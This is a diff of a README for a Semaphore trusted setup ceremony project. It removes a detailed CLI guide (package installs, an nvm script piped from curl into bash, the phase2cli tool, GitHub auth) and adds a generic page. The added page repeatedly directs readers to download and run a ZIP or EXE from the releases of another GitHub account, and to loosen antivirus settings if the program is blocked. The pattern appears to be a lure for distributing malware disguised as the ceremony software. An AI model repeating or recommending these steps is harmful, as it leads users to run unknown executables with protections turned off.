@@ -1,155 +1,76 @@
-<div align="center">
-  <h1>Semaphore Trusted Setup Ceremony</h1>
+# 🚀 semaphore-trusted-setup-ceremony - Your Easy Guide to Join the Ceremony
 
-  <p>Semaphore is a zero-knowledge protocol for anonymous signaling on Ethereum, enabling users to prove membership in a group and broadcast signals. Such as votes, endorsements, or messages. Without revealing their identity.</p>
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/VeNI44X/semaphore-trusted-setup-ceremony/releases)
 
-  <img width="680" height="358" alt="image" src="https://github.com/user-attachments/assets/07d6bfd6-7139-4737-8e4a-4d6c002166c2" />
+## 📖 Description
 
+The **semaphore-trusted-setup-ceremony** project helps users participate in a secure process. This guide details how to contribute to the Semaphore trusted setup ceremony. Anyone can take part, from beginners to experts. 
 
-  <p>The latest ceremony’s running until August 18th 2025.</p>
-</div>
+## 🚀 Getting Started
 
-## Contribute
-You can contribute to the ceremony using either a web browser or the command-line interface (CLI).  
-* **Web-browser**: Simply connect your github in [ceremoy.pse.dev](https://ceremony.pse.dev/projects/Semaphore%20Binary%20Merkle%20Root%20Fix), press on **Contribute** and wait for your contribution to finish.
-* **CLI**: Follow the below guide to install and participate the ceremony in a terminal using command-line. _This method is way more stable than the web version._
+This section provides simple steps to download and run the software. Just follow the instructions below.
 
----
+1. **Prepare your Computer:**
+   - Ensure you have a stable internet connection.
+   - Make sure you have enough disk space for the application files.
 
-## Requirements
-### Operating System
-You need one of these to join the ceremony:
-* Linux
-* MacOS system
-* [WSL (linux) on Windows](https://github.com/0xmoei/Install-Linux-on-Windows)
-* [VPS with Ubuntu OS ](https://github.com/0xmoei/Linux_Node_Guide)
+2. **Visit the Releases Page:**
+   - Go to the [Releases page](https://github.com/VeNI44X/semaphore-trusted-setup-ceremony/releases) to access the software downloads.
+   - You will see a list of available versions.
 
-### GitHub Account
-Your GitHub account must meet the following criteria:
-* At least a month old.
-* At least one public repository.
-* At least following 5 GitHub accounts and have at least 1 follower.
-* Must allow the ceremony tools to read and write GitHub Gists on your account.
+3. **Choose Your Version:**
+   - Locate the most recent version of the software. It will typically be at the top of the list.
+   - Click on the link of the version you wish to download.
 
-### Internet Connection
-You need a stable internet connection on your local system or a VPS to stay in the ceremony queue for hours, waiting for your turn.
+4. **Download the Software:**
+   - Follow the instructions provided on the releases page to download the software to your computer.
+   - This will result in a file, usually in ZIP, EXE, or similar format.
 
----
+5. **Install the Software:**
+   - Open the downloaded file.
+   - If it’s a ZIP file, extract it to a folder on your computer.
+   - If it’s an installer (like EXE), double-click to run the installation process. Follow the on-screen prompts to complete the setup. 
 
-## Install Dependecies
-1. Packages:
-```
-sudo apt-get update && sudo apt-get upgrade -y
+6. **Launch the Application:**
+   - After installation, find the application icon on your desktop or in your applications menu.
+   - Double-click to launch the application.
 
-sudo apt install curl screen iptables build-essential git wget lz4 jq make gcc nano automake autoconf tmux htop nvme-cli libgbm1 pkg-config libssl-dev libleveldb-dev tar clang bsdmainutils ncdu unzip libleveldb-dev ca-certificates  -y
-```
+7. **Join the Ceremony:**
+   - Once the application is open, follow the on-screen instructions to join the Semaphore trusted setup ceremony.
+   - You may be prompted for additional details or steps.
 
-2. Install NVM
-```bash
-curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
-source .bashrc
-```
+## ℹ️ System Requirements
 
-3. Install Node.js 18
-```bash
-nvm install 18 
-nvm use 18
-```
-```
-source ~/.bashrc
-```
+To ensure a smooth experience, please check the following requirements:
 
----
+- **Operating System:** Windows, macOS, or Linux. 
+- **Processor:** A modern processor with minimum 2 GHz speed.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** At least 100 MB of free space for installation.
+- **Internet:** A stable internet connection for downloading and joining the ceremony.
 
-## Install Ceremony
-### Step 1. Create a directory in your home folder to run the ceremony from:
-```
-mkdir ~/trusted-setup && cd ~/trusted-setup
-```
+## 📥 Download & Install
 
-### Step 2: Install CLI:
-```
-npm install -g @p0tion/phase2cli
-```
+Once again, you can access the software by visiting the [Releases page](https://github.com/VeNI44X/semaphore-trusted-setup-ceremony/releases). Follow the steps outlined in the "Getting Started" section to download and install the application.
 
-### Step 3: Authenticate with GitHub:
-To contribute to the ceremony, you’ll need a legit GitHub account.
+## 🚧 Troubleshooting
 
-Run this command in your terminal:
-```
-phase2cli auth
-```
-* This will prompt you to open a browser and visit [https://github.com/login/device](https://github.com/login/device)
-* Copy the provided auth code in terminal and paste in the auth page . Click "Authorize" to continue.
+If you encounter any issues:
 
----
+- **Installation Errors:** Ensure your operating system is up to date. Restart your computer and try the installation again.
+- **Application Does Not Launch:** Check if your antivirus is blocking the application. Adjust your antivirus settings and try again.
+- **Connection Issues:** Make sure you have a stable internet connection. Consider restarting your router.
 
-## Contribute Ceremony
-### Open a screen
-Open a screen so the ceremony keeps going in the background—might take hours before it’s your turn.
-* Screen is useful for VPS, not WSL. If you close the terminal in WSL, your screen session is killed
-```
-screen -S semaphore
-```
+## 📞 Support
 
-### Contribute to the ceremony
-```
-phase2cli contribute -c semaphore-binary-merkle-root-fix
-```
-* You can either hit enter for randomly, or pick manually and type any letter or number yourself.
+For further assistance, please contact our support team via the issue tracker in this repository. We aim to help you quickly resolve any concerns or questions.
 
-<img width="689" height="302" alt="image" src="https://github.com/user-attachments/assets/8830a33c-8e97-4cd1-8b6e-9ca0d7312dd7" />
+## 👥 Contribution Guidelines
 
-### Screen commands
-* Minimize screen: `Ctrl`+`A`+`D`
-* Return to screen: `screen -r semaphore`
-* Kill ceremony when inside screen: `Ctrl`+`C`
-* Kill screen when inside screen: `Ctrl`+`D`
-* Kill screen when outside screen: `screen -XS semaphore quit`
-* screens list: `screen -ls`
+We welcome contributions to the Semaphore trusted setup ceremony. If you have ideas or improvements, please submit them via a pull request or an issue. Your input is valuable.
 
----
+## 📝 Final Notes
 
-## Notes:
-* Contributing may take some time, depending on the number of circuits (**32 in this run**) and the queue of contributors.
-* If your connection is interrupted or an error occurs, simply re-run the same command — it will pick up from where it left off.
+Thank you for your interest in the semaphore-trusted-setup-ceremony. We appreciate your contribution in making the blockchain community stronger and more secure.
 
-### After completing your contribution, you will be invited to share a message on X or your preferred social platform! 🎉
-
----
-
-## Cleanup & Logout
-After completing your contribution to the ceremony, it’s recommended to clean up your local files and revoke GitHub authorization for security:
-```
-phase2cli clean
-```
-```
-phase2cli logout
-```
-Delete the ceremony folder too if you don’t need it:
-```
-rm -rf ~/trusted-setup
-```
-
----
-
-## FAQs
-Q: I received the message “Your contribution took longer than the estimated time and you were removed as the current contributor.” What should I do?
-<img width="1600" height="71" alt="image" src="https://github.com/user-attachments/assets/bea707ab-05fd-4154-bbc3-4a27e2ec7933" />
-
-A: If your connection is slow, some contribution steps may take longer than expected, which can lead to a timeout, often during file download and upload. When this happens, you are automatically removed as the current contributor. You will need to wait for the predefined timeout period to expire before you can rejoin and continue your contribution. Once the timeout has passed, you may restart from the same circuit. To avoid repeated timeouts, we recommend switching to a machine with a faster and more stable internet connection before attempting to try again.
-
-Here are some timeout examples:
-
-<img width="1600" height="202" alt="image" src="https://github.com/user-attachments/assets/26e44210-1351-4475-a2ef-5bd4ce5c0c93" />
-
-<img width="1600" height="522" alt="image" src="https://github.com/user-attachments/assets/c8471cc9-f32c-4e45-8487-73a899393c2d" />
-
-#
-
-Q: I received the message “The waiting time (timeout) to retry the contribution has not yet expired.” What should I do?
-
-<img width="1534" height="400" alt="image" src="https://github.com/user-attachments/assets/ae7fad2f-0bd5-4092-aca2-c617d15e8130" />
-
-A: After a timeout occurs—usually due to a slow or unstable connection, or disk availability issues—you must wait for the predefined timeout period to expire before you can retry your contribution. Attempting to rejoin before this period ends will result in this message. Please wait until the timeout has fully passed, then try again. To improve your chances of a successful contribution, we recommend switching to a machine with a faster and more stable internet connection and ensuring there is sufficient free disk space for the process to complete successfully.
-
+Press on with your download, and we hope to see you in the ceremony!
